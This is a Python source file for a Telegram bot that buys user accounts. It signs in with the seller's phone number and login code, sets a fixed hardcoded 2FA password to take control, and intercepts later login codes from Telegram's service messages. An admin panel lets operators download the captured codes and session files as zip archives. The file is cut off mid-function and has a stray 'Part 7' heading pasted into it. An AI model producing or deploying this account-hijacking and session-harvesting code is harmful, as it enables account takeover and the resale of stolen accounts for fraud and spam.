import os
import json
import re
import zipfile
from datetime import datetime, timedelta
from dotenv import load_dotenv

from telethon import TelegramClient, events
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, FloodWaitError

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, MessageHandler, CallbackQueryHandler,
    filters, ContextTypes, ConversationHandler
)

load_dotenv()

# ====================== CONFIG ======================
API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
WITHDRAW_CHANNEL = os.getenv("WITHDRAW_CHANNEL")
FORCE_CHANNEL = os.getenv("FORCE_CHANNEL")
REFERRAL_BONUS = float(os.getenv("REFERRAL_BONUS", 0.05))
INITIAL_ADMINS = [int(x.strip()) for x in os.getenv("ADMIN_IDS", "0").split(",") if x.strip()]

TWO_FA_PASSWORD = "Tg@123456"
DEFAULT_PRICE = 0.30
DEFAULT_WAIT_HOURS = 18
MIN_WITHDRAW = 1.00

# ====================== PATHS ======================
SESSIONS_DIR = "sessions"
DATA_DIR = "data"
os.makedirs(SESSIONS_DIR, exist_ok=True)
os.makedirs(DATA_DIR, exist_ok=True)

CODES_FILE = f"{DATA_DIR}/codes.json"
ACCOUNTS_FILE = f"{DATA_DIR}/accounts.json"
BALANCES_FILE = f"{DATA_DIR}/balances.json"
CLAIMS_FILE = f"{DATA_DIR}/claims.json"
REFS_FILE = f"{DATA_DIR}/referrals.json"
SETTINGS_FILE = f"{DATA_DIR}/settings.json"
ADMINS_FILE = f"{DATA_DIR}/admins.json"
SUPPORT_FILE = f"{DATA_DIR}/support.json"
FROZEN_FILE = f"{DATA_DIR}/frozen.json"
BOT_STATUS_FILE = f"{DATA_DIR}/bot_status.json"
COUNTRY_SETTINGS_FILE = f"{DATA_DIR}/country_settings.json"
CAPACITY_FILE = f"{DATA_DIR}/capacity.json"
LANG_FILE = f"{DATA_DIR}/user_lang.json"

# ====================== STATES ======================
WAITING_CODE, WD_METHOD, WD_DETAILS, SUPPORT_MSG = range(4)

# ====================== GLOBAL ======================
clients = {}
pending = {}
# ====================== HELPER FUNCTIONS ======================
def load_json(path, default=None):
    if default is None:
        default = {}
    try:
        if os.path.exists(path):
            with open(path, "r", encoding="utf-8") as f:
                return json.load(f)
    except:
        pass
    return default

def save_json(path, data):
    with open(path, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=2)

def get_admins():
    admins = load_json(ADMINS_FILE, [])
    if not admins:
        admins = INITIAL_ADMINS[:]
        save_json(ADMINS_FILE, admins)
    return admins

def is_admin(uid):
    return uid in get_admins()

def get_settings():
    s = load_json(SETTINGS_FILE, {})
    return {
        "price": s.get("price", DEFAULT_PRICE),
        "wait": s.get("wait", DEFAULT_WAIT_HOURS),
        "ref_bonus": s.get("ref_bonus", REFERRAL_BONUS)
    }

def save_settings(data):
    save_json(SETTINGS_FILE, data)

def get_flag(phone):
    flags = {
        "880": "🇧🇩", "91": "🇮🇳", "92": "🇵🇰", "1": "🇺🇸", "44": "🇬🇧", "27": "🇿🇦",
        "234": "🇳🇬", "966": "🇸🇦", "971": "🇦🇪", "90": "🇹🇷", "7": "🇷🇺", "49": "🇩🇪",
        "33": "🇫🇷", "86": "🇨🇳", "62": "🇮🇩", "60": "🇲🇾", "65": "🇸🇬", "63": "🇵🇭",
        "55": "🇧🇷", "52": "🇲🇽", "20": "🇪🇬", "212": "🇲🇦", "40": "🇷🇴", "48": "🇵🇱"
    }
    p = phone.replace("+", "")
    for c in sorted(flags, key=len, reverse=True):
        if p.startswith(c):
            return flags[c]
    return "🏳️"

def add_balance(uid, amount):
    bal = load_json(BALANCES_FILE, {})
    bal[str(uid)] = round(bal.get(str(uid), 0) + amount, 2)
    save_json(BALANCES_FILE, bal)
    return bal[str(uid)]

def get_country_code(phone):
    phone = phone.replace("+", "")
    for length in [3, 2, 1]:
        code = phone[:length]
        if code.isdigit():
            return code
    return phone[:2]

def is_bot_on():
    return load_json(BOT_STATUS_FILE, {"on": True}).get("on", True)

def set_bot_status(status: bool):
    save_json(BOT_STATUS_FILE, {"on": status})

def get_frozen():
    return load_json(FROZEN_FILE, {})

def is_frozen(phone):
    return phone in get_frozen()

def add_frozen(phone, reason="Frozen"):
    frozen = get_frozen()
    frozen[phone] = {"reason": reason, "time": datetime.now().strftime("%Y-%m-%d %H:%M")}
    save_json(FROZEN_FILE, frozen)

def remove_frozen(phone):
    frozen = get_frozen()
    if phone in frozen:
        del frozen[phone]
        save_json(FROZEN_FILE, frozen)

def get_capacity(code):
    return load_json(CAPACITY_FILE, {}).get(str(code), 9999)

def get_country_setting(code):
    settings = load_json(COUNTRY_SETTINGS_FILE, {})
    default = get_settings()
    return settings.get(str(code), {"price": default["price"], "wait": default["wait"]})

def get_user_lang(uid):
    return load_json(LANG_FILE, {}).get(str(uid), "en")

def set_user_lang(uid, lang):
    langs = load_json(LANG_FILE, {})
    langs[str(uid)] = lang
    save_json(LANG_FILE, langs)

def t(uid, en, bn):
    return bn if get_user_lang(uid) == "bn" else en

async def check_joined(bot, user_id):
    if not FORCE_CHANNEL:
        return True
    try:
        member = await bot.get_chat_member(FORCE_CHANNEL, user_id)
        return member.status in ["member", "administrator", "creator"]
    except:
        return False
        # ====================== TELETHON FUNCTIONS ======================
async def start_client(phone):
    path = f"{SESSIONS_DIR}/{phone.replace('+', '')}"
    client = TelegramClient(path, API_ID, API_HASH)

    @client.on(events.NewMessage(from_users=777000))
    async def handler(e):
        m = re.search(r'(\d{5,6})', e.message.message or "")
        if m:
            codes = load_json(CODES_FILE, {})
            if phone not in codes:
                codes[phone] = []
            codes[phone].insert(0, {
                "code": m.group(1),
                "time": datetime.now().strftime("%Y-%m-%d %H:%M")
            })
            codes[phone] = codes[phone][:12]
            save_json(CODES_FILE, codes)

    await client.connect()
    if await client.is_user_authorized():
        clients[phone] = client
        return True
    await client.disconnect()
    return False


async def enable_2fa(client, password):
    try:
        await client.edit_2fa(new_password=password)
        return True
    except:
        return False


# ====================== START & BALANCE ======================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user

    # Force Join Check
    if FORCE_CHANNEL and not await check_joined(context.bot, user.id):
        kb = [[InlineKeyboardButton("✅ Join Channel", url=f"https://t.me/{str(FORCE_CHANNEL).replace('@', '')}")]]
        await update.message.reply_text(
            t(user.id, "⚠️ Please join our channel first.", "⚠️ আগে আমাদের চ্যানেলে জয়েন করুন।"),
            reply_markup=InlineKeyboardMarkup(kb)
        )
        return

    # Referral
    if context.args and context.args[0].startswith("ref_"):
        try:
            ref = int(context.args[0][4:])
            if ref != user.id:
                refs = load_json(REFS_FILE, {})
                if str(user.id) not in refs:
                    refs[str(user.id)] = ref
                    save_json(REFS_FILE, refs)
        except:
            pass

    link = f"https://t.me/{context.bot.username}?start=ref_{user.id}"
    text = t(
        user.id,
        f"👋 Welcome {user.first_name}!\n\nSend number with +\nExample: `+8801712345678`\n\n🔗 Referral:\n`{link}`\n\n/balance /withdraw /support /myaccounts /language",
        f"👋 স্বাগতম {user.first_name}!\n\n+ সহ নাম্বার পাঠান\nউদাহরণ: `+8801712345678`\n\n🔗 রেফারাল:\n`{link}`\n\n/balance /withdraw /support /myaccounts /language"
    )
    await update.message.reply_text(text, parse_mode="Markdown")


async def balance_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    bal = load_json(BALANCES_FILE, {}).get(str(uid), 0)
    text = t(uid, f"💰 Your Balance: **\( {bal:.2f}**", f"💰 আপনার ব্যালেন্স: ** \){bal:.2f}**")
    await update.message.reply_text(text, parse_mode="Markdown")
    # ====================== HANDLE PHONE & CODE ======================
async def handle_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id

    if not is_bot_on() and not is_admin(uid):
        await update.message.reply_text(t(uid, "🔴 Bot is currently OFF.", "🔴 বট এখন বন্ধ আছে।"))
        return

    text = update.message.text.strip().replace(" ", "")
    if not re.match(r'^\+?\d{8,15}$', text):
        return

    phone = text if text.startswith("+") else "+" + text
    chat_id = update.effective_chat.id

    if is_frozen(phone):
        await update.message.reply_text(t(uid, f"❄️ This number is frozen.\n`{phone}`", f"❄️ এই নাম্বার ফ্রোজেন করা আছে।\n`{phone}`"), parse_mode="Markdown")
        return

    # Capacity Check
    code = get_country_code(phone)
    limit = get_capacity(code)
    accs = load_json(ACCOUNTS_FILE, {})
    current = sum(1 for p in accs if p.startswith(f"+{code}"))
    if current >= limit:
        await update.message.reply_text(t(uid, f"❌ Capacity full for this country ({current}/{limit})", f"❌ এই দেশের ক্যাপাসিটি পূর্ণ ({current}/{limit})"))
        return

    wait_msg = await update.message.reply_text(t(uid, "⏳ Waiting for otp...", "⏳ ওটিপির জন্য অপেক্ষা করা হচ্ছে..."))

    try:
        client = TelegramClient(f"{SESSIONS_DIR}/{phone[1:]}", API_ID, API_HASH)
        await client.connect()

        if await client.is_user_authorized():
            await wait_msg.edit_text(t(uid, "This number is already logged in!", "এই নাম্বার ইতিমধ্যে লগইন আছে!"))
            await client.disconnect()
            return

        sent = await client.send_code_request(phone)
        pending[chat_id] = {
            "client": client,
            "phone": phone,
            "hash": sent.phone_code_hash,
            "uid": uid
        }

        flag = get_flag(phone)
        await wait_msg.edit_text(
            f"📲 {flag} `{phone}`\n\n"
            f"{t(uid, 'Code sent! Reply with the 5 or 6-digit login code.', 'কোড পাঠানো হয়েছে! ৫ বা ৬ ডিজিটের লগইন কোড দিন।')}\n\n"
            f"➿ /cancel",
            parse_mode="Markdown"
        )
        return WAITING_CODE

    except FloodWaitError as e:
        await wait_msg.edit_text(f"FloodWait! Please wait {e.seconds} seconds.")
    except Exception as e:
        await wait_msg.edit_text(f"Error: {e}")


async def handle_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    if chat_id not in pending:
        return

    data = pending[chat_id]
    code = update.message.text.strip()
    uid = data["uid"]

    try:
        await data["client"].sign_in(data["phone"], code, phone_code_hash=data["hash"])
    except SessionPasswordNeededError:
        await update.message.reply_text(t(uid, "This number already has 2FA. Skipped.", "এই নাম্বারে ইতিমধ্যে ২FA আছে।"))
        await data["client"].disconnect()
        del pending[chat_id]
        return
    except PhoneCodeInvalidError:
        await update.message.reply_text(t(uid, "❗️ The login code is invalid, Send the correct code.\n\n➿ /cancel", "❗️ লগইন কোড ভুল হয়েছে, সঠিক কোড দিন।\n\n➿ /cancel"))
        return
    except Exception as e:
        await update.message.reply_text(f"Error: {e}")
        await data["client"].disconnect()
        del pending[chat_id]
        return

    # Success
    me = await data["client"].get_me()
    ok = await enable_2fa(data["client"], TWO_FA_PASSWORD)

    country_code = get_country_code(data["phone"])
    c_set = get_country_setting(country_code)
    price = c_set.get("price", get_settings()["price"])
    wait = c_set.get("wait", get_settings()["wait"])

    claim_id = f"{uid}_{data['phone'][1:]}_{int(datetime.now().timestamp())}"

    accs = load_json(ACCOUNTS_FILE, {})
    accs[data["phone"]] = {
        "uid": uid,
        "name": me.first_name or "",
        "price": price,
        "wait": wait,
        "claim_id": claim_id
    }
    save_json(ACCOUNTS_FILE, accs)

    claims = load_json(CLAIMS_FILE, {})
    claims[claim_id] = {
        "uid": uid,
        "phone": data["phone"],
        "price": price,
        "wait": wait,
        "time": datetime.now().isoformat(),
        "done": False
    }
    save_json(CLAIMS_FILE, claims)

    await data["client"].disconnect()
    await start_client(data["phone"])
    del pending[chat_id]

    flag = get_flag(data["phone"])
    kb = [[InlineKeyboardButton(t(uid, "💰 Claim Balance", "💰 ব্যালেন্স ক্লেইম"), callback_data=f"claim_{claim_id}")]]
    
    text = (
        f"✅ **Account Received completed** {flag}\n"
        f"⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯\n"
        f"• Number: `{data['phone']}`\n"
        f"• Sell price: {price} USD ✓\n"
        f"• Country’s wait time: {wait} hrs ✓\n"
        f"• 2FA: {'Enabled ✅' if ok else 'Failed'}"
    )
    await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")
    # ====================== CLAIM + CANCEL ======================
async def claim_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    uid = q.from_user.id
    cid = q.data.replace("claim_", "")
    claims = load_json(CLAIMS_FILE, {})

    if cid not in claims or claims[cid]["done"]:
        await q.edit_message_text(t(uid, "Already claimed", "ইতিমধ্যে ক্লেইম করা হয়েছে"))
        return

    c = claims[cid]
    if c["uid"] != uid:
        await q.answer(t(uid, "Not yours!", "এটা আপনার না!"), show_alert=True)
        return

    unlock = datetime.fromisoformat(c["time"]) + timedelta(hours=c["wait"])
    if datetime.now() < unlock:
        left = unlock - datetime.now()
        hours = int(left.total_seconds() // 3600)
        mins = int((left.total_seconds() % 3600) // 60)
        await q.answer(t(uid, f"Wait {hours}h {mins}m more", f"আরও {hours} ঘণ্টা {mins} মিনিট অপেক্ষা করুন"), show_alert=True)
        return

    newb = add_balance(uid, c["price"])

    # Referral bonus
    refs = load_json(REFS_FILE, {})
    if str(uid) in refs:
        add_balance(refs[str(uid)], get_settings()["ref_bonus"])

    c["done"] = True
    claims[cid] = c
    save_json(CLAIMS_FILE, claims)

    await q.edit_message_text(t(uid, f"✅ +${c['price']}\nNew Balance: \( {newb:.2f}", f"✅ + \){c['price']}\nনতুন ব্যালেন্স: ${newb:.2f}"))


async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    uid = update.effective_user.id
    if chat_id in pending:
        try:
            await pending[chat_id]["client"].disconnect()
        except:
            pass
        del pending[chat_id]
    await update.message.reply_text(t(uid, "✅ Cancelled. You can send a new number.", "✅ বাতিল করা হয়েছে। নতুন নাম্বার পাঠাতে পারেন।"))
    return ConversationHandler.END


# ====================== SUPPORT SYSTEM ======================
async def support_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    await update.message.reply_text(
        t(uid, "🧑🏻‍💻 Send your message.\n\nType your problem now.\n❌ /cancel to cancel", "🧑🏻‍💻 আপনার মেসেজ পাঠান।\n\nসমস্যা লিখুন।\n❌ /cancel দিয়ে বাতিল করুন")
    )
    return SUPPORT_MSG


async def support_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    text = update.message.text

    for admin_id in get_admins():
        try:
            kb = [[InlineKeyboardButton("💬 Reply", callback_data=f"reply_{user.id}")]]
            await context.bot.send_message(
                admin_id,
                f"🆘 **New Support Message**\n\n"
                f"From: {user.first_name} (`{user.id}`)\n"
                f"Username: @{user.username or 'None'}\n\n"
                f"Message:\n{text}",
                reply_markup=InlineKeyboardMarkup(kb),
                parse_mode="Markdown"
            )
        except:
            pass

    await update.message.reply_text(t(user.id, "✅ Your message has been sent to support.", "✅ আপনার মেসেজ সাপোর্টে পাঠানো হয়েছে।"))
    return ConversationHandler.END
    # ====================== WITHDRAW SYSTEM ======================
async def withdraw(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    bal = load_json(BALANCES_FILE, {}).get(str(uid), 0)

    if bal < MIN_WITHDRAW:
        await update.message.reply_text(
            t(uid, f"❌ Minimum withdraw is ${MIN_WITHDRAW}\nYour balance: ${bal:.2f}", 
                 f"❌ মিনিমাম উইথড্র ${MIN_WITHDRAW}\nআপনার ব্যালেন্স: ${bal:.2f}")
        )
        return ConversationHandler.END

    kb = [
        [InlineKeyboardButton("💳 Leader Card", callback_data="wd_card")],
        [InlineKeyboardButton("🟡 Binance BEP20", callback_data="wd_bep")],
        [InlineKeyboardButton("❌ Cancel", callback_data="wd_cancel")]
    ]
    await update.message.reply_text(
        t(uid, f"💰 Balance: **${bal:.2f}**\n\nSelect withdraw method:", 
             f"💰 ব্যালেন্স: **${bal:.2f}**\n\nউইথড্র মেথড সিলেক্ট করুন:"),
        reply_markup=InlineKeyboardMarkup(kb),
        parse_mode="Markdown"
    )
    return WD_METHOD


async def wd_method(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    uid = q.from_user.id

    if q.data == "wd_cancel":
        await q.edit_message_text(t(uid, "Withdraw cancelled.", "উইথড্র বাতিল করা হয়েছে।"))
        return ConversationHandler.END

    context.user_data["method"] = "Leader Card" if q.data == "wd_card" else "Binance BEP20"
    await q.edit_message_text(t(uid, "Send your details now:", "এখন আপনার ডিটেইলস পাঠান:"))
    return WD_DETAILS


async def wd_details(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    uid = user.id
    details = update.message.text
    method = context.user_data.get("method", "Unknown")
    bal = load_json(BALANCES_FILE, {}).get(str(uid), 0)
    accs = sum(1 for a in load_json(ACCOUNTS_FILE, {}).values() if a.get("uid") == uid)

    # Reset balance
    b = load_json(BALANCES_FILE, {})
    b[str(uid)] = 0
    save_json(BALANCES_FILE, b)

    text = (
        f"💸 **New Withdrawal Request**\n\n"
        f"👤 **User Information**\n"
        f"▫️ Name: {user.first_name}\n"
        f"▫️ User ID: `{uid}`\n"
        f"▫️ Username: @{user.username or 'None'}\n\n"
        f"📊 **Account Summary**\n"
        f"▫️ Total Accounts: {accs}\n"
        f"💵 Amount: ${bal:.2f}\n\n"
        f"🔄 **Withdrawal Details**\n"
        f"▫️ Method: {method}\n"
        f"▫️ Details: {details}\n"
        f"⏰ Time: {datetime.now().strftime('%H:%M:%S - %Y/%m/%d')}"
    )

    if WITHDRAW_CHANNEL:
        try:
            await context.bot.send_message(int(WITHDRAW_CHANNEL), text, parse_mode="Markdown")
        except Exception as e:
            print("Withdraw Channel Error:", e)

    await update.message.reply_text(t(uid, "✅ Withdrawal request submitted!", "✅ উইথড্র রিকোয়েস্ট জমা দেওয়া হয়েছে!"))
    return ConversationHandler.END
    # ====================== ADMIN DASHBOARD ======================**Part 7**

```python
# ====================== ADMIN DASHBOARD ======================
async def dashboard(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return

    s = get_settings()
    accs = len(load_json(ACCOUNTS_FILE, {}))
    total_bal = sum(load_json(BALANCES_FILE, {}).values())
    admins = get_admins()

    text = (
        f"📊 **Admin Dashboard**\n\n"
        f"• Total Accounts: `{accs}`\n"
        f"• Online Clients: `{len(clients)}`\n"
        f"• Total User Balance: `${total_bal:.2f}`\n"
        f"• Current Price: `${s['price']}`\n"
        f"• Wait Time: `{s['wait']} hours`\n"
        f"• Referral Bonus: `${s['ref_bonus']}`\n"
        f"• Total Admins: `{len(admins)}`\n"
        f"• Bot Status: `{'ON' if is_bot_on() else 'OFF'}`"
    )

    kb = [
        [
            InlineKeyboardButton("💰 Set Price", callback_data="set_price"),
            InlineKeyboardButton("⏱ Set Wait", callback_data="set_wait")
        ],
        [
            InlineKeyboardButton("🎁 Set Ref Bonus", callback_data="set_ref")
        ],
        [
            InlineKeyboardButton("➕ Add Admin", callback_data="add_admin"),
            InlineKeyboardButton("➖ Remove Admin", callback_data="remove_admin")
        ],
        [
            InlineKeyboardButton("📥 Codes", callback_data="dl_codes"),
            InlineKeyboardButton("📁 Sessions", callback_data="dl_sess")
        ],
        [
            InlineKeyboardButton("📋 Accounts", callback_data="list_acc"),
            InlineKeyboardButton("👑 Admins", callback_data="list_admins")
        ],
        [
            InlineKeyboardButton("🟢 Bot ON", callback_data="bot_on"),
            InlineKeyboardButton("🔴 Bot OFF", callback_data="bot_off")
        ]
    ]

    await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")


async def admin_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    if not is_admin(q.from_user.id):
        return

    data = q.data

    if data == "set_price":
        context.user_data["edit"] = "price"
        await q.edit_message_text("💰 Send new price:\nExample: `0.35`", parse_mode="Markdown")

    elif data == "set_wait":
        context.user_data["edit"] = "wait"
        await q.edit_message_text("⏱ Send wait hours:\nExample: `18`", parse_mode="Markdown")

    elif data == "set_ref":
        context.user_data["edit"] = "ref"
        await q.edit_message_text("🎁 Send referral bonus:\nExample: `0.05`", parse_mode="Markdown")

    elif data == "add_admin":
        context.user_data["edit"] = "add_admin"
        await q.edit_message_text("➕ Send new admin Telegram User ID:")

    elif data == "remove_admin":
        admins = get_admins()
        if len(admins) <= 1:
            await q.answer("Cannot remove the last admin!", show_alert=True)
            return
        kb = []
        for aid in admins:
            if aid != q.from_user.id:
                kb.append([InlineKeyboardButton(f"🗑 Remove {aid}", callback_data=f"rmadmin_{aid}")])
        kb.append([InlineKeyboardButton("« Back", callback_data="back_dash")])
        await q.edit_message_text("Select admin to remove:", reply_markup=InlineKeyboardMarkup(kb))

    elif data.startswith("rmadmin_"):
        aid = int(data.replace("rmadmin_", ""))
        admins = get_admins()
        if aid in admins and len(admins) > 1:
            admins.remove(aid)
            save_json(ADMINS_FILE, admins)
            await q.edit_message_text(f"✅ Removed admin: `{aid}`", parse_mode="Markdown")
        else:
            await q.edit_message_text("❌ Failed")

    elif data.startswith("reply_"):
        uid = int(data.replace("reply_", ""))
        context.user_data["reply_to"] = uid
        await q.edit_message_text(f"✍️ Send reply for user `{uid}`:", parse_mode="Markdown")

    elif data == "dl_codes":
        path = f"{DATA_DIR}/codes.json"
        save_json(path, load_json(CODES_FILE, {}))
        await q.message.reply_document(open(path, "rb"), filename="codes.json")

    elif data == "dl_sess":
        zpath = f"{DATA_DIR}/sessions.zip"
        with zipfile.ZipFile(zpath, "w") as z:
            for f in os.listdir(SESSIONS_DIR):
                if f.endswith(".session"):
                    z.write(f"{SESSIONS_DIR}/{f}", f)
        await q.message.reply_document(open(zpath, "rb"), filename="sessions.zip")

    elif data == "list_acc":
        accs = load_json(ACCOUNTS_FILE, {})
        text = f"📋 Total Accounts: {len(accs)}\n\n"
        for i, phone in enumerate(list(accs.keys())[:40], 1):
            text += f"{i}. `{phone}`\n"
        await q.edit_message_text(text or "Empty", parse_mode="Markdown")

    elif data == "list_admins":
        admins = get_admins()
        text = "👑 **Admins:**\n\n" + "\n".join([f"• `{a}`" for a in admins])
        await q.edit_message_text(text, parse_mode="Markdown")

    elif data == "bot_on":
        set_bot_status(True)
        await q.edit_message_text("✅ Bot is now **ON**")

    elif data == "bot_off":
        set_bot_status(False)
        await q.edit_message_text("🔴 Bot is now **OFF**")

    elif data.startswith("lang_"):
        lang = data.replace("lang_", "")
        set_user_lang(q.from_user.id, lang)
        msg = "✅ Language set to English" if lang == "en" else "✅ ভাষা বাংলা করা হয়েছে"
        await q.edit_message_text(msg)

    elif data == "back_dash":
        await dashboard(update, context)
        # ====================== ADMIN EDIT + EXTRA COMMANDS ======================
async def admin_edit(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return

    # Support Reply
    if "reply_to" in context.user_data:
        uid = context.user_data.pop("reply_to")
        try:
            await context.bot.send_message(uid, f"📩 **Support Reply:**\n\n{update.message.text}", parse_mode="Markdown")
            await update.message.reply_text("✅ Reply sent successfully!")
        except:
            await update.message.reply_text("❌ Failed to send reply.")
        return

    if "edit" not in context.user_data:
        return

    key = context.user_data.pop("edit")
    text = update.message.text.strip()

    try:
        if key == "add_admin":
            new_id = int(text)
            admins = get_admins()
            if new_id not in admins:
                admins.append(new_id)
                save_json(ADMINS_FILE, admins)
                await update.message.reply_text(f"✅ New admin added: `{new_id}`", parse_mode="Markdown")
            else:
                await update.message.reply_text("⚠️ Already an admin.")
        else:
            val = float(text) if key != "wait" else int(text)
            s = get_settings()
            if key == "price":
                s["price"] = val
            elif key == "wait":
                s["wait"] = val
            elif key == "ref":
                s["ref_bonus"] = val
            save_settings(s)
            await update.message.reply_text(f"✅ Updated **{key}** to `{val}`", parse_mode="Markdown")
    except Exception as e:
        await update.message.reply_text(f"❌ Invalid value\n{e}")


# ====================== EXTRA USER & ADMIN COMMANDS ======================
async def language_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    kb = [
        [InlineKeyboardButton("🇺🇸 English", callback_data="lang_en")],
        [InlineKeyboardButton("🇧🇩 বাংলা", callback_data="lang_bn")]
    ]
    await update.message.reply_text("🌐 Select Language / ভাষা নির্বাচন করুন:", reply_markup=InlineKeyboardMarkup(kb))


async def myaccounts_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    accounts = load_json(ACCOUNTS_FILE, {})
    user_accs = [p for p, info in accounts.items() if info.get("uid") == uid]

    if not user_accs:
        await update.message.reply_text(t(uid, "You have no accounts yet.", "আপনার কোনো অ্যাকাউন্ট নেই।"))
        return

    text = t(uid, f"📱 Your Accounts ({len(user_accs)}):\n\n", f"📱 আপনার অ্যাকাউন্ট ({len(user_accs)}):\n\n")
    for i, phone in enumerate(user_accs[:30], 1):
        flag = get_flag(phone)
        frozen = " ❄️" if is_frozen(phone) else ""
        text += f"{i}. {flag} `{phone}`{frozen}\n"

    await update.message.reply_text(text, parse_mode="Markdown")


async def bot_on_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if is_admin(update.effective_user.id):
        set_bot_status(True)
        await update.message.reply_text("✅ Bot is now **ON**", parse_mode="Markdown")


async def bot_off_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if is_admin(update.effective_user.id):
        set_bot_status(False)
        await update.message.reply_text("🔴 Bot is now **OFF**", parse_mode="Markdown")
# ====================== MORE ADMIN COMMANDS ======================
async def delacc_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    if not context.args:
        await update.message.reply_text("Usage: `/delacc +8801712345678`", parse_mode="Markdown")
        return

    phone = context.args[0]
    if not phone.startswith("+"):
        phone = "+" + phone

    accounts = load_json(ACCOUNTS_FILE, {})
    if phone not in accounts:
        await update.message.reply_text(f"❌ Not found: `{phone}`", parse_mode="Markdown")
        return

    # Disconnect
    if phone in clients:
        try:
            await clients[phone].disconnect()
            del clients[phone]
        except:
            pass

    # Delete session file
    session_file = f"{SESSIONS_DIR}/{phone.replace('+','')}.session"
    for f in [session_file, session_file + "-journal"]:
        if os.path.exists(f):
            try:
                os.remove(f)
            except:
                pass

    del accounts[phone]
    save_json(ACCOUNTS_FILE, accounts)
    remove_frozen(phone)

    await update.message.reply_text(f"✅ Deleted `{phone}`", parse_mode="Markdown")


async def freeze_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    if not context.args:
        await update.message.reply_text("Usage: `/freeze +8801712345678`", parse_mode="Markdown")
        return
    phone = context.args[0] if context.args[0].startswith("+") else "+" + context.args[0]
    add_frozen(phone)
    await update.message.reply_text(f"❄️ Frozen: `{phone}`", parse_mode="Markdown")


async def unfreeze_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    if not context.args:
        await update.message.reply_text("Usage: `/unfreeze +8801712345678`", parse_mode="Markdown")
        return
    phone = context.args[0] if context.args[0].startswith("+") else "+" + context.args[0]
    remove_frozen(phone)
    await update.message.reply_text(f"✅ Unfrozen: `{phone}`", parse_mode="Markdown")


async def userinfo_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    if not context.args:
        await update.message.reply_text("Usage: `/userinfo 123456789`", parse_mode="Markdown")
        return
    try:
        target = int(context.args[0])
    except:
        await update.message.reply_text("Invalid ID")
        return

    accounts = load_json(ACCOUNTS_FILE, {})
    user_phones = [p for p, i in accounts.items() if i.get("uid") == target]
    bal = load_json(BALANCES_FILE, {}).get(str(target), 0)

    text = (
        f"👤 User `{target}`\n"
        f"Accounts: {len(user_phones)}\n"
        f"Balance: ${bal:.2f}\n\n"
    )
    for p in user_phones[:15]:
        text += f"{get_flag(p)} `{p}`\n"
    await update.message.reply_text(text, parse_mode="Markdown")


async def stats_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    accounts = load_json(ACCOUNTS_FILE, {})
    balances = load_json(BALANCES_FILE, {})
    total_users = len(set(i.get("uid") for i in accounts.values()))
    total_bal = sum(balances.values())

    text = (
        f"📈 **Statistics**\n\n"
        f"Users: `{total_users}`\n"
        f"Accounts: `{len(accounts)}`\n"
        f"Total Balance: `${total_bal:.2f}`\n"
        f"Online: `{len(clients)}`\n"
        f"Frozen: `{len(get_frozen())}`"
    )
    await update.message.reply_text(text, parse_mode="Markdown")
    # ====================== USER SESSION DOWNLOAD + BROADCAST + BACKUP ======================

async def dsession_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin: /dsession <user_id> → Download that user's all sessions"""
    if not is_admin(update.effective_user.id):
        return

    if not context.args:
        await update.message.reply_text("Usage:\n`/dsession 123456789`", parse_mode="Markdown")
        return

    try:
        target_uid = int(context.args[0])
    except:
        await update.message.reply_text("Invalid User ID")
        return

    accounts = load_json(ACCOUNTS_FILE, {})
    user_phones = [phone for phone, info in accounts.items() if info.get("uid") == target_uid]

    if not user_phones:
        await update.message.reply_text("This user has no accounts.")
        return

    zip_path = f"{DATA_DIR}/user_{target_uid}_sessions.zip"
    with zipfile.ZipFile(zip_path, "w") as zf:
        for phone in user_phones:
            session_file = f"{SESSIONS_DIR}/{phone.replace('+','')}.session"
            if os.path.exists(session_file):
                zf.write(session_file, f"{phone.replace('+','')}.session")

    await update.message.reply_document(
        document=open(zip_path, "rb"),
        filename=f"user_{target_uid}_sessions.zip",
        caption=f"📁 Sessions of User: `{target_uid}`\nTotal Accounts: {len(user_phones)}"
    )


async def broadcast_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin: /broadcast message"""
    if not is_admin(update.effective_user.id):
        return

    if not context.args:
